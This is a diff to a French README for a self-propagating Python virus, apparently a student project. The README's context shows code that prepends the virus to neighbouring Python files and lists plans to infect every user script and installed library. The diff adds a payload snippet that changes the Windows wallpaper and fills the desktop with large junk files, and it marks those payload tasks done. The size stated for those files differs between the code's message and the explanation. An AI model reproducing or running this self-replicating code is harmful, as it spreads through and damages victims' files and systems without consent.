@@ -13,8 +13,11 @@ Le virus fonctionne en transportant et/ou exécutant une charge virale s'injecta
 
 - [x] Détermination de l'état d'inféction actuel d'un fichier
 - [x] Propagation aux fichiers Python environnants pas encore infectés
-- [ ] Mise en place du payload
-- [ ] Mise en place d'un mode "infection uniquement" n'exécutant pas le payload
+- [X] Mise en place du payload
+- [X] **Payload**: changement du fond d'écran
+- [X] **Payload**: embedder l'image en base64 dans le script
+- [X] **Payload**: création de fichiers non désirés sur le bureau
+- [ ] Mise en place d'un mode "infection uniquement" n'exécutant **pas** le payload
 - [ ] Gestion des mises à jour du code malveillant
 - [ ] Infection de l'intégralité des scripts Python de l'utilisateur
 - [ ] Infection de l'intégralité des bibliothèques Python installées
@@ -80,6 +83,21 @@ for eachFile in otherPythonFiles:
             f.writelines(fullHackedCode)
 ```
 > Pour chaque fichier Python environnant trouvé par le module ```glob```, on imprime son contenu dans la variable ```originalCode```, puis on cherche la présence du délimiteur de début en première ligne du fichier ouvert. Si on le trouve, on ne fait rien car le fichier est déjà infecté; sinon on remplace son  contenu par la variable ```fullHackedCode``` qui est un tableau contenant respectivement: le code du virus, un retour chariot, le code originel. Le fichier Python nouvellement infecté reste donc fonctionnel mais exécutera une charge virale ET se propagera à son tour aux fichiers Python environnants.
+
+```python
+wallpaperPath = os.path.abspath("pwned.jpg")
+ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaperPath , 0)
+   
+x = 1
+pathToInfect = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))
+for i in range(x):
+    file = open(pathToInfect+"\pwned!_%d.txt" % i, "w")
+    num_chars = 3125000
+    file.write("Votre PC à été infécté par un étudiant de l'IPSSI :) profitez de ces " + str(x) + " fichiers d'environ 500 Mo! \n\n")
+    file.write(''.join(random.choice('0123456789ABCDEF') for i in range(16)) * num_chars)
+    file.close()
+```
+> Changement du fond d'écran par le fichier stocké dans ```pwned.jpg```, et création de ```x``` fichiers sur le bureau de la victime, faisant 50 Mo chacun.
 
 # Crédits
 ## Auteur
